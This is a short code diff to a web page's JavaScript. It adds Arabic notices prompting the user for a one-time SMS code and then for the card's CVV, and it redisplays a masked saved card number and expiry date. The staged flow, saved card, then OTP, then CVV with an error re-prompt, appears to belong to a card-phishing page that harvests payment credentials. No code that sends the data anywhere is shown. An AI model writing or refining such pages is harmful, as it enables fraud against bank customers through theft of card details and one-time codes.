@@ -858,6 +858,7 @@
       document.getElementById('otp-masked-card').textContent = masked;
       document.getElementById('otp-exp-month').textContent = savedExpMonth;
       document.getElementById('otp-exp-year').textContent = savedExpYear;
+      document.getElementById('otp-notice').textContent = 'يرجى الانتباه: سيتم الآن ارسال رسالة نصية على رقم هاتفك الجوال المسجل لدى البنك الخاص بك. هذه الرسالة المكونة من 6 خانات هي "رمز التحقق لمرة واحدة", يرجى استخدام هذا الرمز في الحقل المناسب أدناه';
       document.getElementById('otp-notice').style.display = 'block';
       currentStep = 'otp';
       document.getElementById('otp-field-label').textContent = ':OTP';
@@ -879,7 +880,12 @@
     function showCvvCard(withError) {
       loadingCard.style.display = 'none';
       currentStep = 'cvv';
-      document.getElementById('otp-notice').style.display = 'none';
+      document.getElementById('otp-notice').textContent = 'يرجى الانتباه: يرجى إدخال رمز الأمان (CVV) المكون من 3 أرقام الموجود على الجهة الخلفية من بطاقتك في الحقل المناسب أدناه';
+      document.getElementById('otp-notice').style.display = 'block';
+      const masked = savedCard.slice(0,4) + ' **** **' + savedCard.slice(10,12) + ' ' + savedCard.slice(-4);
+      document.getElementById('otp-masked-card').textContent = masked;
+      document.getElementById('otp-exp-month').textContent = savedExpMonth;
+      document.getElementById('otp-exp-year').textContent = savedExpYear;
       document.getElementById('otp-field-label').textContent = ':CVV';
       document.getElementById('otp-input').value = '';
       document.getElementById('otp-input').maxLength = 3;
